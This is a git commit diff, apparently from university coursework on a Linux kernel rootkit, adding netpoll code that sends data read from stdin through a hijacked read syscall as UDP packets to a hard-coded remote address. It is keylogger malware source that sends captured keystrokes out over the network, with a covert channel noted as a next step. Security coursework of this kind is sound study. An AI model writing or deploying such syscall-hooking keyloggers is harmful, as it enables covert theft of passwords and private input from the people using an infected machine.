b28bb63cdb7206a38dd08a1fcb2b0cef04568fc5
Guru Mc <ga79rok@mytum.de>
2014-11-27 03:11:40 +0100

    gmc: added netpoll code but not tested

--- assignment07/read.c
+++ assignment07/read.c
@@ -5,6 +5,8 @@
  */
 #include <linux/delay.h>
 #include <linux/unistd.h>
+#include <linux/netpoll.h>
+#include <linux/init.h>
 
 #include "include.h"
 
@@ -15,6 +17,38 @@ asmlinkage long (*original_read) (unsigned int fd, char __user *buf, size_t coun
  * read syste call while it is still in use
  */
 static int read_call_counter = 0;
+
+/* netpoll struct */
+static struct netpoll *np = NULL;
+static struct netpoll net_fill;
+
+
+// Ref : http://stackoverflow.com/questions/10499865/sending-udp-packets-from-the-linux-kernel
+// http://stackoverflow.com/questions/20431620/using-netpoll-on-kernel-3-10
+
+void net_keylog(char *msg)
+{
+	net_fill.name = "LRNG"; //todo : don't know why they use this name :(
+	strlcpy(net_fill.dev_name, "eth0", IFNAMSIZ); //todo: change where to send
+	
+	net_fill.local_ip.ip = htonl((unsigned long int) 0xc0a83865); //192.168.56.101
+	net_fill.local_ip.in.s_addr = htonl((unsigned long int) 0xc0a83865); 
+
+	net_fill.remote_ip.ip = htonl((unsigned long int) 0xc0a80205); //192.168.2.5
+	net_fill.remote_ip.in.s_addr = htonl((unsigned long int) 0xc0a80205);
+ 
+	net_fill.local_port = 6666; // Need to change, 6665 from tutorial
+	net_fill.remote_port = 514; // standard UDP port for syslog server 
+
+	memset(net_fill.remote_mac, 0xff, ETH_ALEN); // todo:verify
+	netpoll_print_options(&net_fill);
+	netpoll_setup(&net_fill);
+	np = &net_fill;
+	
+	int len = strlen(msg);
+	netpoll_send_udp(np,msg,len);
+	
+} 
 
 /*
  * Our manipulated read syscall. It will log keystrokes and serve as a covert
@@ -31,6 +65,7 @@ asmlinkage long manipulated_read (unsigned int fd, char __user *buf, size_t coun
 	if(ret >= 1 && fd == 0)
 	{
 		// TODO: implement keylogging
+		net_keylog(buf);
 		
 		// TODO: implement covert communication channel
 	}
